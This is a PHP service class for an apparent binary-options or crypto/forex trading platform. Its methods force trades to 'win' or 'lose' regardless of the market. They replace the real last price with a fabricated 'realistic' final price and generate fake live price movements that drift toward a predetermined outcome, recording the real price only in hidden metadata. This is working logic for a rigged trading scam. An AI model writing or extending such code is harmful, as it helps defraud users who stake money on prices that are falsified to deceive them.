<?php

namespace App\Services;

class TradeService
{
    /**
     * Calculate Amount Based Guaranteed Win Logic
     */
    public function calculateAmountBasedGuaranteedWin(array $trade_data, float $real_last_price): array
    {
        // Extract data
        $prediction = $trade_data['direction']; // 'up' or 'down'
        $purchase_price = (float) $trade_data['purchase_price'];
        $investment = (float) $trade_data['purchase_quantity'];
        $profit_rate = (int) ($trade_data['price_range_percent'] ?? 41); // Default 41%
        
        // Calculate profit and payout
        $profit_amount = $investment * ($profit_rate / 100);
        $payout = $investment + $profit_amount;

        // Create a realistic final price with small movement
        $recorded_last_price = $this->calculateRealisticFinalPrice($purchase_price, $prediction);
        
        return [
            'user_id' => $trade_data['user_id'],
            'symbol' => $trade_data['symbol'],
            'direction' => $prediction,
            'purchase_quantity' => round($investment, 8),
            'purchase_price' => round($purchase_price, 8),
            'final_price' => round($recorded_last_price, 8),
            'result' => 'win',
            'price_range_percent' => $profit_rate,
            'profit_amount' => round($profit_amount, 8),
            'payout' => round($payout, 8),
            'force_applied' => true,
            'meta' => [
                'real_last_price' => round($real_last_price, 8),
                'fetched_final_price' => round($real_last_price, 8),
                'used_final_price' => round($recorded_last_price, 8)
            ]
        ];
    }

    /**
     * Calculate a forced losing result with a realistic final price on the opposite side
     * of the user's prediction. The returned structure mirrors calculateAmountBasedGuaranteedWin
     * but with 'result' => 'lose' and a negative profit amount equal to the stake.
     */
    public function calculateForcedLoss(array $trade_data, float $real_last_price): array
    {
        $prediction = $trade_data['direction']; // 'up' or 'down'
        $opposite = $prediction === 'up' ? 'down' : 'up';

        $purchase_price = (float) $trade_data['purchase_price'];
        $investment = (float) $trade_data['purchase_quantity'];
        $profit_rate = (int) ($trade_data['price_range_percent'] ?? 41);

        // Use the realistic final price generator but on the opposite direction so the
        // displayed final price indicates a loss for the user. Keep movement small.
        $used_final_price = $this->calculateRealisticFinalPrice($purchase_price, $opposite, strtolower($trade_data['symbol'] ?? 'btc'));

        // Loss is the full stake (negative profit)
        $profit_amount = -1.0 * $investment;
        $payout = 0;

        return [
            'user_id' => $trade_data['user_id'],
            'symbol' => $trade_data['symbol'],
            'direction' => $prediction,
            'purchase_quantity' => round($investment, 8),
            'purchase_price' => round($purchase_price, 8),
            'final_price' => round($used_final_price, 8),
            'result' => 'lose',
            'price_range_percent' => $profit_rate,
            'profit_amount' => round($profit_amount, 8),
            'payout' => round($payout, 8),
            'force_applied' => true,
            'meta' => [
                'real_last_price' => round($real_last_price, 8),
                'fetched_final_price' => round($real_last_price, 8),
                'used_final_price' => round($used_final_price, 8)
            ]
        ];
    }

    /**
     * Calculate simulated price for real-time display
     */
    private $finalPriceCache = [];

    public function calculateSimulatedPrice(float $purchasePrice, string $direction, int $secondsElapsed, int $totalSeconds): float
    {
        $orderId = $_GET['order_id'] ?? null;
        
        // If we have a cached final price for this order, use it for the last 5 seconds
        if ($orderId && isset($this->finalPriceCache[$orderId])) {
            $finalPrice = $this->finalPriceCache[$orderId];
            if ($secondsElapsed >= ($totalSeconds - 5)) {
                return $finalPrice;
            }
        }
        
        // Calculate a natural price movement
        $progress = $secondsElapsed / $totalSeconds;
        
        // Create realistic market fluctuations
        $baseMovement = sin($progress * pi() * 2) * 0.001; // Base sine wave
        $noise = (mt_rand(-5, 5) / 10000); // Small random noise
        
        // For the first 90% of time, allow natural movement
        if ($progress <= 0.9) {
            $movement = $baseMovement + $noise;
            $newPrice = $purchasePrice * (1 + $movement);
            
            // Keep within 0.2% range for realism
            $maxDeviation = $purchasePrice * 0.002;
            return min(max($newPrice, $purchasePrice - $maxDeviation), $purchasePrice + $maxDeviation);
        }
        
        // In the last 10% of time, gradually move towards final price
        if (!isset($this->finalPriceCache[$orderId])) {
            // Calculate and cache final price
            $targetMovement = ($direction === 'up' ? 0.003 : -0.003); // 0.3% movement
            $finalPrice = $purchasePrice * (1 + $targetMovement);
            $this->finalPriceCache[$orderId] = $finalPrice;
        }
        
        $finalPrice = $this->finalPriceCache[$orderId];
        
        // Smooth transition to final price
        $transitionProgress = ($progress - 0.9) / 0.1; // 0 to 1 in last 10%
        return $purchasePrice + ($finalPrice - $purchasePrice) * $transitionProgress;
    }

    /**
     * Calculate realistic final price
     */
    private $priceCache = [];

    public function calculateRealisticTradePrice(float $purchasePrice, string $direction, float $progress, string $orderId): float 
    {
        // Cache final price if not already cached
        if (!isset($this->priceCache[$orderId]['final_price'])) {
            $this->priceCache[$orderId] = [
                'final_price' => $this->calculateRealisticFinalPrice($purchasePrice, $direction),
                'start_price' => $purchasePrice
            ];
        }

        $cache = $this->priceCache[$orderId];
        $finalPrice = $cache['final_price'];

        // If we're in the last 10% of the trade, move towards final price
        if ($progress >= 90) {
            $transitionProgress = ($progress - 90) / 10; // 0 to 1 in last 10%
            return $purchasePrice + ($finalPrice - $purchasePrice) * $transitionProgress;
        }

        // Otherwise use small controlled movements
        $maxMove = 0.001; // 0.1% max movement
        $baseMove = sin($progress / 15) * $maxMove; // Smooth sine wave
        $noise = (mt_rand(-3, 3) / 10000); // Small random noise
        
        if ($direction === 'up') {
            $movement = abs($baseMove) + $noise;
        } else {
            $movement = -abs($baseMove) + $noise;
        }

        return $purchasePrice * (1 + $movement);
    }

    private function calculateRealisticFinalPrice(float $purchase_price, string $direction, string $symbol = 'btc'): float
    {
        // Define volatility ranges for different asset types
        $volatilityRanges = [
            // Crypto (high volatility)
            'btc' => ['min' => 0.5, 'max' => 2.0],
            'eth' => ['min' => 0.5, 'max' => 2.0],
            'usdt' => ['min' => 0.01, 'max' => 0.05],
            'xrp' => ['min' => 0.3, 'max' => 1.5],
            'doge' => ['min' => 0.3, 'max' => 1.5],
            
            // Forex (lower volatility)
            'eur' => ['min' => 0.05, 'max' => 0.2],
            'gbp' => ['min' => 0.05, 'max' => 0.2],
            'jpy' => ['min' => 0.05, 'max' => 0.2],
            'aud' => ['min' => 0.05, 'max' => 0.2],
            'cad' => ['min' => 0.05, 'max' => 0.2],
            'chf' => ['min' => 0.05, 'max' => 0.2],
            
            // Gold/Metals (medium volatility)
            'xau' => ['min' => 0.1, 'max' => 0.5],  // Gold
            'xag' => ['min' => 0.15, 'max' => 0.6], // Silver
            'xpt' => ['min' => 0.15, 'max' => 0.6], // Platinum
            'xpd' => ['min' => 0.15, 'max' => 0.6]  // Palladium
        ];
        
        // Get volatility range for the symbol, default to BTC if not found
        $range = $volatilityRanges[strtolower($symbol)] ?? $volatilityRanges['btc'];
        
        // Calculate base movement based on asset type
        $baseMin = $range['min'] / 100; // Convert to decimal
        $baseMax = $range['max'] / 100;
        
        // Random movement within the asset's volatility range
        $movement = mt_rand($baseMin * 10000, $baseMax * 10000) / 10000;
        
        // Add a small random noise for natural price movement
        $noise = mt_rand(-10, 10) / 10000; // ±0.001 random noise
        
        $totalMovement = $movement + $noise;
        
        if ($direction === 'up') {
            return $purchase_price * (1 + $totalMovement);
        } else {
            return $purchase_price * (1 - $totalMovement);
        }
    }

    /**
     * Calculate final trade result with proper scaling based on asset type
     */
    public function calculateTradeResult(array $order, float $final_price): array
    {
        $symbol = strtolower($order['symbol']);
        $purchase_price = (float) $order['purchase_price'];
        $direction = $order['direction'];
        $quantity = (float) $order['purchase_quantity'];
        $profit_rate = (int) ($order['price_range_percent'] ?? 41); // Default 41%
        
        // Define win thresholds for different asset types
        $winThresholds = [
            // Crypto needs bigger moves to win
            'btc' => 0.5,
            'eth' => 0.5,
            'usdt' => 0.05,
            'xrp' => 0.3,
            'doge' => 0.3,
            
            // Forex needs smaller moves
            'eur' => 0.1,
            'gbp' => 0.1,
            'jpy' => 0.1,
            'aud' => 0.1,
            'cad' => 0.1,
            'chf' => 0.1,
            
            // Gold/Metals medium threshold
            'xau' => 0.2,
            'xag' => 0.25,
            'xpt' => 0.25,
            'xpd' => 0.25
        ];
        
        $threshold = ($winThresholds[$symbol] ?? 0.5) / 100; // Default to BTC threshold
        
        // Calculate price movement
        $priceChange = ($final_price - $purchase_price) / $purchase_price;
        
        // Determine win/lose based on direction and threshold
        $result = '';
        if ($direction === 'up') {
            $result = $priceChange >= $threshold ? 'win' : 'lose';
        } else {
            $result = $priceChange <= -$threshold ? 'win' : 'lose';
        }
        
        // Calculate profit/loss
        $profit_amount = $result === 'win' ? $quantity * ($profit_rate / 100) : 0;
        $payout = $result === 'win' ? $quantity + $profit_amount : 0;
        
        return [
            'result' => $result,
            'final_price' => round($final_price, 8),
            'profit_amount' => round($profit_amount, 8),
            'payout' => round($payout, 8)
        ];
    }
}